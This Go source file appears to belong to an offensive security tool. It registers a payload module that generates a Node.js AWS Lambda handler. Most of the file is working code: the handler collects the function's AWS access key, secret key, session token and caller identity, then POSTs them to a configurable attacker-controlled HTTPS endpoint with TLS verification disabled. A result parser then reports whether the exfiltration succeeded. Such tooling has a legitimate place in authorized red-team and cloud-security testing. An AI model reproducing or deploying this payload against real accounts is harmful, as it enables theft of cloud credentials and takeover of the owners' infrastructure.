// Unless explicitly stated otherwise all files in this repository are licensed under the Apache-2.0 License.
// This product includes software developed at Datadog (https://www.datadoghq.com/)
// Copyright 2026 Datadog, Inc.

package lambda

import (
	"encoding/json"
	"fmt"
	"github.com/DataDog/pathrunner/pkg/modules"
	"github.com/DataDog/pathrunner/pkg/payloads"
	"strings"
)

type ExfilHTTPSNodejsPayload struct{}

func init() {
	_ = payloads.Register(&ExfilHTTPSNodejsPayload{})
}

func (p *ExfilHTTPSNodejsPayload) GetName() string {
	return "exfil/https-nodejs"
}

func (p *ExfilHTTPSNodejsPayload) GetDescription() string {
	return "Extract credentials via Node.js and POST them to an attacker-controlled HTTPS endpoint"
}

func (p *ExfilHTTPSNodejsPayload) GetTags() []string {
	return []string{
		payloads.TagServiceLambda,
		payloads.TagLanguageNodeJS,
		payloads.TagTechniqueExfil,
		payloads.TagTransportWebhook,
	}
}

func (p *ExfilHTTPSNodejsPayload) GetOptions() []modules.Option {
	return []modules.Option{
		{
			Name:        "HTTPS_URL",
			Description: "Attacker-controlled HTTPS endpoint to receive credentials",
			Required:    true,
		},
		{
			Name:        "USER_AGENT",
			Description: "HTTP User-Agent header",
			Required:    false,
			Default:     "Mozilla/5.0 (compatible; AWS-Lambda)",
		},
		{
			Name:        "TIMEOUT",
			Description: "Request timeout in seconds",
			Required:    false,
			Default:     "10",
		},
	}
}

func (p *ExfilHTTPSNodejsPayload) GenerateCode(options map[string]string) (string, error) {
	code := `'use strict';

exports.handler = async (event, context) => {
  const result = { status: 'pending', requestId: context.awsRequestId };

  const targetURL = process.env.HTTPS_URL || '';
  const userAgent = process.env.USER_AGENT || 'Mozilla/5.0 (compatible; AWS-Lambda)';
  const timeoutSec = parseInt(process.env.TIMEOUT || '10', 10);

  const payload = {
    requestId: context.awsRequestId,
    credentials: {
      access_key_id: process.env.AWS_ACCESS_KEY_ID,
      secret_access_key: process.env.AWS_SECRET_ACCESS_KEY,
      session_token: process.env.AWS_SESSION_TOKEN,
    },
    region: process.env.AWS_REGION || process.env.AWS_DEFAULT_REGION,
    functionName: process.env.AWS_LAMBDA_FUNCTION_NAME,
  };

  // Resolve caller identity if STS is reachable
  try {
    try {
      const { STSClient, GetCallerIdentityCommand } = require('@aws-sdk/client-sts');
      const identity = await new STSClient({}).send(new GetCallerIdentityCommand({}));
      payload.caller_identity = { account: identity.Account, arn: identity.Arn, userId: identity.UserId };
    } catch (_) {
      const AWS = require('aws-sdk');
      const identity = await new AWS.STS().getCallerIdentity().promise();
      payload.caller_identity = { account: identity.Account, arn: identity.Arn, userId: identity.UserId };
    }
  } catch (_) {
    payload.caller_identity = null;
  }

  const body = JSON.stringify(payload);

  await new Promise((resolve, reject) => {
    const https = require('https');
    const url = new URL(targetURL);
    const options = {
      hostname: url.hostname,
      port: url.port || 443,
      path: url.pathname + url.search,
      method: 'POST',
      rejectUnauthorized: false,
      timeout: timeoutSec * 1000,
      headers: {
        'Content-Type': 'application/json',
        'Content-Length': Buffer.byteLength(body),
        'User-Agent': userAgent,
      },
    };

    const req = https.request(options, (res) => {
      result.statusCode = res.statusCode;
      result.status = 'sent';
      resolve();
    });

    req.on('error', (err) => {
      result.status = 'error';
      result.error = err.message;
      resolve();
    });

    req.on('timeout', () => {
      req.destroy();
      result.status = 'timeout';
      resolve();
    });

    req.write(body);
    req.end();
  });

  return { statusCode: 200, body: JSON.stringify(result) };
};
`
	return code, nil
}

func (p *ExfilHTTPSNodejsPayload) ProcessResult(result string) (string, error) {
	var lambdaResponse map[string]interface{}
	if err := json.Unmarshal([]byte(result), &lambdaResponse); err != nil {
		return result, err
	}

	body, ok := lambdaResponse["body"].(string)
	if !ok {
		return result, nil
	}

	var parsedBody map[string]interface{}
	if err := json.Unmarshal([]byte(body), &parsedBody); err != nil {
		return result, err
	}

	var output strings.Builder
	output.WriteString("=== HTTPS Exfiltration Results (Node.js) ===\n\n")

	status, _ := parsedBody["status"].(string)
	switch status {
	case "sent":
		output.WriteString("Credentials successfully exfiltrated\n")
		if code, ok := parsedBody["statusCode"].(float64); ok {
			output.WriteString(fmt.Sprintf("  Server response: %d\n", int(code)))
		}
		output.WriteString("  Check your collection server for the received data\n")
	case "error":
		errMsg, _ := parsedBody["error"].(string)
		output.WriteString("ERROR: Failed to exfiltrate: " + errMsg + "\n")
	case "timeout":
		output.WriteString("ERROR: Request timed out — verify HTTPS_URL is reachable from Lambda\n")
	default:
		output.WriteString("Unknown result status: " + status + "\n")
	}

	return output.String(), nil
}

func (p *ExfilHTTPSNodejsPayload) Validate(options map[string]string) error {
	if options["HTTPS_URL"] == "" {
		return fmt.Errorf("HTTPS_URL is required")
	}
	return nil
}
